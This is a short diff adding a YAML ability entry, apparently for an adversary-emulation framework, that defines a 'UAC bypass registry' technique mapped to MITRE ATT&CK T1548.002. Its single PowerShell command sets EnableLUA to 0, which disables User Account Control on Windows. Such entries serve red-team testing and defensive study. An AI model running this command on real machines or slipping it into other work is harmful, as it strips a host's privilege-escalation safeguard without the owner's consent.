@@ -1,0 +1,12 @@
+- description: Set a registry key to allow UAC bypass
+  id: 665432a4-42e7-4ee1-af19-a9a8c9455d0c
+  name: UAC bypass registry
+  platforms:
+    windows:
+      psh:
+        command: |
+          New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1548.002
+    name: "Abuse Elevation Control Mechanism: Bypass User Access Control"
